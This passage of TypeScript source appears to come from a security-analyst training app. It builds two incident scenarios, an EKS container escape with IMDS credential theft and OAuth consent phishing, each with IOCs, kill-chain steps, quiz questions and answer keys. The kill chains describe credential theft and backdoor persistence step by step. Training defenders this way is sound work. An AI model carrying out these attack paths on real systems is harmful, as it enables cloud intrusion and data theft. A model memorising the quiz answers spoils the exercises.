    { type: "user",   value: "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123", reputation: "suspicious", tags: ["assumed-role", "credential-source"] },
    { type: "url",    value: "s3://rocketstack-secrets-prod/db-passwords.json", reputation: "suspicious", tags: ["accessed-object", "secrets-bucket"] },
    { type: "host",   value: "193.233.48.71:5000", reputation: "malicious", tags: ["attacker-registry", "image-source"] },
  ];

  const killchain = [
    { ts: T(0),           phase: "Execution",         action: "kubectl exec into api-prod container via compromised CI/CD token from Tor exit node 193.233.48.71" },
    { ts: T(2 * MIN),     phase: "Execution",         action: "nsenter with full host namespaces — container escape to EC2 node OS, root access achieved" },
    { ts: T(3 * MIN),     phase: "Credential Access", action: "curl to 169.254.169.254 IMDS — IAM role credentials for eks-node-role retrieved" },
    { ts: T(5 * MIN),     phase: "Credential Access", action: "GetCallerIdentity from external IP confirms stolen credentials are valid" },
    { ts: T(6 * MIN),     phase: "Discovery",         action: "ListBuckets + DescribeInstances — attacker mapping entire AWS account from outside" },
    { ts: T(9 * MIN),     phase: "Exfiltration",      action: "GetObject s3://rocketstack-secrets-prod/db-passwords.json — production DB credentials stolen" },
    { ts: T(12 * MIN),    phase: "Persistence",       action: "Privileged pod 'svc-monitoring-backup' created in kube-system with hostPID+hostNetwork" },
    { ts: T(15 * MIN),    phase: "Persistence",       action: "IAM user 'svc-monitoring-backup' created with AdministratorAccess — cloud-level backdoor established" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 15,
      prompt: "Event 1 (kubectl exec) has a FP explanation. What specific detail in the event definitively makes it suspicious?",
      kind: "single",
      options: [
        { value: "a", label: "The container name 'api-prod-7f8b9c' does not match the deployment naming convention used in this cluster" },
        { value: "b", label: "kubectl exec that spawns an interactive shell in a production namespace is malicious regardless of source" },
        { value: "c", label: "The source IP 193.233.48.71 is not an internal or corporate IP — it is a known Tor exit node" },
        { value: "d", label: "The CI/CD service account token was used, and pipeline tokens should be scoped to deployments, not exec" },
      ],
      answer: "c",
      explanation: "kubectl exec from an internal developer IP is routine. kubectl exec from 193.233.48.71 (a known Tor exit node, verifiable via threat intel) is immediately suspicious — legitimate CI/CD pipelines don't route through Tor. This is the distinguishing detail that separates routine debugging from an intrusion.",
    },
    {
      id: "q2", xp: 20,
      prompt: "Event 3 (curl to 169.254.169.254) is described as an AWS Instance Metadata Service query. Why is this particularly dangerous in a Kubernetes context?",
      kind: "single",
      options: [
        { value: "a", label: "It exposes the container's environment variables, including any secrets the pod spec injected as plaintext env entries at runtime" },
        { value: "b", label: "IMDS returns IAM role credentials that grant cloud API access OUTSIDE the cluster — the attacker moves from container to cloud" },
        { value: "c", label: "It lets the attacker sniff traffic from other pods on the same node, since every container shares the host network namespace" },
        { value: "d", label: "The IMDS response carries the cluster's admin kubeconfig, handing the attacker full control of the Kubernetes control plane" },
      ],
      answer: "b",
      explanation: "The IMDS link-local address (169.254.169.254) is accessible from any process on the EC2 node, including containers. After the nsenter escape, the attacker queries IMDS from the host OS and receives the IAM role credentials attached to the EC2 node. These credentials are valid AWS API keys — the attack pivots from the Kubernetes cluster into the entire AWS account.",
    },
    {
      id: "q3", xp: 20,
      prompt: "Events 5-7 (GetCallerIdentity, ListBuckets, DescribeInstances) show AWS API calls from IP 193.233.48.71. What is the critical anomaly?",
      kind: "single",
      options: [
        { value: "a", label: "The calls were made over plain HTTP to the AWS endpoint, so the SigV4 signature and session token travelled in the clear" },
        { value: "b", label: "The IAM role eks-node-role is over-permissive — a node role needs EC2 and ECR permissions, not s3:ListAllMyBuckets across the account" },
        { value: "c", label: "The source IP 193.233.48.71 is not an AWS IP range — legitimate EC2 role usage comes from AWS IP ranges, not external IPs" },
        { value: "d", label: "sts:GetCallerIdentity returned the full account ID and role ARN, handing the attacker the account details needed to plan escalation" },
      ],
      answer: "c",
      explanation: "When an EC2 instance uses its IAM role normally, CloudTrail shows the source IP as the EC2's private or public IP (within AWS IP ranges). Seeing eks-node-role calls from an external IP (193.233.48.71) means the credentials were stolen and are being used from outside AWS — a clear indicator of IMDS credential theft.",
    },
    {
      id: "q4", xp: 25,
      prompt: "What is the correct priority order for containing this incident?",
      kind: "single",
      options: [
        { value: "a", label: "Delete the backdoor IAM user → Rotate EKS node credentials → Delete privileged pod → Investigate how the CI/CD token was stolen → Enable IMDSv2 afterwards" },
        { value: "b", label: "Rotate the CI/CD deploy token first → Review the Kubernetes audit logs → Rotate eks-node-role credentials once the full scope is known" },
        { value: "c", label: "Isolate EKS node → Revoke eks-node-role credentials → Delete IAM user svc-monitoring-backup → Delete privileged pod → Rotate CI/CD deploy token → Enable IMDSv2" },
        { value: "d", label: "Snapshot the node's EBS volume → Open a case with AWS Support → Wait for their guidance before revoking anything, to avoid tipping off the attacker" },
      ],
      answer: "c",
      explanation: "Correct sequence: (1) Revoke eks-node-role credentials immediately — stops all active cloud API calls. (2) Delete the svc-monitoring-backup IAM user — closes the cloud-level backdoor. (3) Delete the privileged pod in kube-system — closes the cluster-level backdoor. (4) Rotate the compromised CI/CD deploy token — closes initial access. (5) Enforce IMDSv2 (requires session-oriented requests, blocks SSRF-style IMDS access).",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT40",
    attack_kind: "Cloud Attack / Container Escape",
    briefing: "GuardDuty raised a finding against the production EKS cluster at 02:50 for anomalous use of the eks-node-role credentials. The Kubernetes audit log separately shows exec activity into container api-prod-7f8b9c by the ci-deploy-token service account.",
    narrative: "APT40 obtains a compromised CI/CD deploy token and uses it to exec into a production container via kubectl. Using nsenter, they escape to the EC2 node OS and query the AWS Instance Metadata Service (169.254.169.254) to steal the IAM role credentials bound to the node. From an external IP (Tor exit node), they enumerate the entire AWS account, access a secrets S3 bucket containing production database passwords, create a privileged pod in kube-system for cluster persistence, and create a backdoor IAM user with AdministratorAccess. Three log sources must be correlated: Kubernetes audit, EDR on the node, and AWS CloudTrail.",
    learning_objectives: [
      "Understand the container escape path: kubectl exec → nsenter → host OS access",
      "Know that IMDS (169.254.169.254) queries from containers can steal IAM credentials",
      "Identify that CloudTrail API calls from external IPs using EC2 role = credential theft",
      "Correlate three independent log sources (K8s audit + EDR + CloudTrail) into one attack chain",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── OAuth Consent Grant Phishing — Silent BEC (⭐⭐⭐⭐ Expert) ─────────────

export function buildOAuthConsentPhishingScenario(scenarioId = "oauth-consent-grant-phishing"): ScenarioBundle {
  const { title, events, T, MIN, APP_ID } = oauthConsentPhishingScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: "productivty-suite.com",         reputation: "malicious", tags: ["typosquat", "oauth-phishing", "redirect-uri", "missing-i"] },
    { type: "domain", value: "productivity-suite.pro",        reputation: "malicious", tags: ["exfil-inbox-target", "inbox-forwarding-domain"] },
    { type: "email",  value: "backupmail@productivity-suite.pro", reputation: "malicious", tags: ["exfil-target", "inbox-forwarding"] },
    { type: "user",   value: APP_ID,                          reputation: "malicious", tags: ["rogue-oauth-app", "productivity-suite-pro", "unverified-publisher"] },
  ];

  const killchain = [
    { ts: T(-48 * 60 * MIN), phase: "Resource Development", action: "'Productivity Suite Pro' app registered on typosquat domain productivty-suite.com" },
    { ts: T(0),        phase: "Initial Access",        action: "j.chen clicks phishing link and grants Mail.ReadWrite + Files.ReadWrite.All + Calendars.Read to rogue app" },
    { ts: T(55 * MIN), phase: "Collection",            action: "App reads 1,247 mailbox items via Graph API MailItemsAccessed at 23:09" },
    { ts: T(58 * MIN), phase: "Persistence",           action: "Inbox forwarding rule created by app principal to backupmail@productivity-suite.pro" },
    { ts: T(62 * MIN), phase: "Collection",            action: "312 SharePoint files accessed by app principal including confidential contract" },
    { ts: T(65 * MIN), phase: "Discovery",             action: "847 calendar events read — org chart reconstruction via meeting attendees" },
    { ts: T(70 * MIN), phase: "Privilege Escalation",  action: "Admin consent attempt for tenant-wide access FAILS (requires Global Admin role)" },
    { ts: T(75 * MIN), phase: "Detection",             action: "UEBA risk score spikes to 91 — SuspiciousOAuthConsent with 4 contributing behaviors" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 25,
      prompt: "Events 1 and 2 both have FP explanations. What is the first specific detail that, if noticed, would distinguish this from a legitimate productivity app?",
      kind: "single",
      options: [
        { value: "a", label: "The app requested Mail.ReadWrite (write access is unusual for a legitimate archival tool)" },
        { value: "b", label: "The app was registered only 48 hours before the consent (Event 10 retrospective)" },
        { value: "c", label: "The source IP 207.154.110.53 of the consent is not a known corporate egress address" },
        { value: "d", label: "The consent happened at 22:14, well outside j.chen's normal business hours" },
      ],
      answer: "b",
      explanation: "Event 10 reveals the app was registered 48 hours before the attack. Legitimate enterprise apps (Slack, Zoom, Salesforce) are years old with thousands of users. A 2-day-old app with an unverified publisher requesting broad permissions is a major red flag. The Mail.ReadWrite permission is also suspicious — read access would suffice for a legitimate archival tool.",
    },
    {
      id: "q2", xp: 20,
      prompt: "Event 4 (inbox rule creation) shows UserId as the app ID, not j.chen's email. What does this tell you?",
      kind: "single",
      options: [
        { value: "a", label: "j.chen created the rule herself in the Outlook web UI, and the audit log records the app GUID as the client identifier" },
        { value: "b", label: "The rule was created by the OAuth app using its delegated permissions — the app acted autonomously, not j.chen" },
        { value: "c", label: "The New-InboxRule operation failed because the app lacks Mail.ReadWrite, and denied attempts are logged under the app GUID" },
        { value: "d", label: "A second attacker signed in with j.chen's stolen password, and Exchange logs the registered app GUID for such sessions" },
      ],
      answer: "b",
      explanation: "When UserId in O365 audit logs is an application GUID (not a user UPN), the action was performed by the application using its granted delegated permissions. j.chen is asleep — the app is operating autonomously on her behalf using the OAuth token she granted at 22:14. This is the defining characteristic of OAuth consent phishing: no credential theft needed.",
    },
    {
      id: "q3", xp: 20,
      prompt: "Why is this attack classified as Expert difficulty when the consent grant (Event 1) happened from a legitimate corporate IP?",
      kind: "single",
      options: [
        { value: "a", label: "Because correlating Entra ID sign-in logs, the O365 unified audit log and Exchange mailbox audit into one timeline is inherently an Expert-level task for any analyst" },
        { value: "b", label: "Because there is no malware, no suspicious attacker IPs (Events 2-9 use Microsoft IPs) and no credential theft — only legitimate Graph API use under delegated consent" },
        { value: "c", label: "Because the Purview DLP policy was scoped to Exchange transport rules only, so the Graph API download path was never inspected and raised no alert at all" },
        { value: "d", label: "Because the infrastructure and tradecraft match a state-sponsored actor tracked by Microsoft Threat Intelligence, and that attribution alone raises the rating" },
      ],
      answer: "b",
      explanation: "The attack is silent by design: Events 2-9 originate from Microsoft's own IP ranges (40.99.8.12 is Azure). There is no external C2, no malware, no suspicious authentication. Traditional indicators (bad IP, bad hash, credential spray) are all absent. The only anomaly is behavioral: an app registered 48h ago with unverified publisher, making autonomous after-hours requests. This requires UEBA and app reputation analysis, not signature detection.",
    },
    {
      id: "q4", xp: 25,
      prompt: "What are the two immediate containment actions?",
      kind: "multi",
      options: [
        { value: "a", label: "Revoke the OAuth consent grant for 'Productivity Suite Pro' (App ID a3f9b1c2…) in Azure AD Enterprise Applications" },
        { value: "b", label: "Delete the inbox forwarding rule to productivity-suite.pro from j.chen's mailbox" },
        { value: "c", label: "Force a password reset for j.chen and require re-registration of their MFA method in Entra ID before re-enabling sign-in" },
        { value: "d", label: "Add 40.99.8.12 to the perimeter firewall deny list so the application can no longer reach the tenant from that address" },
      ],
      answer: ["a", "b"],
      explanation: "Priority: (1) Revoke the OAuth consent — immediately terminates the app's access token and all API access. (2) Delete the inbox forwarding rule — stops ongoing email exfiltration. Password reset (c) is wrong — the attacker never used j.chen's password; they used the OAuth token. Blocking 40.99.8.12 (d) is Microsoft's own IP and would break legitimate O365 access.",
    },
];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT29 / Cozy Bear",
    attack_kind: "Identity Attack / Business Email Compromise",
    briefing: "Microsoft Purview DLP fired at 23:26 when a document on the Finance SharePoint site was opened by an application named 'Productivity Suite Pro', and Sentinel UEBA raised the same service principal's risk score. The registered user is j.chen.",
    narrative: "APT29 registers a malicious Azure AD app named 'Productivity Suite Pro' on a typosquatted domain (productivty-suite.com — missing the 'i') and sends j.chen a phishing link. Chen clicks 'Allow' — granting the app Mail.ReadWrite + Files.ReadWrite.All + Calendars.Read. The app silently reads 1,247 emails, copies 312 SharePoint files including a confidential GlobalLogis contract, creates an inbox forwarding rule to an external address, and maps the org chart via calendar. No malware. No suspicious IPs. No credential theft. Everything happens through Microsoft's own Graph API using delegated permissions the user granted. The only IoCs are app registration age, unverified publisher, and a typosquatted redirect URI domain.",
    learning_objectives: [
      "Understand OAuth consent phishing: attacker uses legitimate Graph API permissions, no malware or credential theft needed",
      "Recognize that when O365 UserId is an app GUID, the app acted autonomously — not the user",
      "Identify app registration age and publisher verification as key pre-attack indicators",
      "Know that revocation of OAuth consent (not password reset) is the correct containment action",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

/**
 * Scenario packs live in their own files and return `alerts: []` — importing the
 * alert generator from here would create a cycle. Attach the alerts on the way
 * out so packaged scenarios reach the student's queue exactly like built-in ones.
 */
function withAlerts(build: (id?: string) => ScenarioBundle) {
  return (scenarioId?: string): ScenarioBundle => {
    const b = build(scenarioId);
    // D-11: builders sometimes append the "benign control" events at the end of the
    // array with an EARLIER timestamp, so a viewer that streams by array order jumps
    // backwards in time (an event from a day before the ransom note showing up last).
    // Sort by ts here so array order == chronological order everywhere the bundle is
    // consumed — the static /scenarios log viewer AND the dashboard story scheduler.
    const events = [...b.events].sort((a, c) => new Date(a.ts).getTime() - new Date(c.ts).getTime());
    const alerts = b.alerts?.length ? b.alerts : eventsToAlerts(events, b.scenario_id);
    return { ...b, events, alerts };
  };
}

export function buildScenarioBySlug(slug: string): ScenarioBundle | null {
  const found = SCENARIOS.find(s => s.slug === slug);
  if (!found) return null;
  return found.build();
}
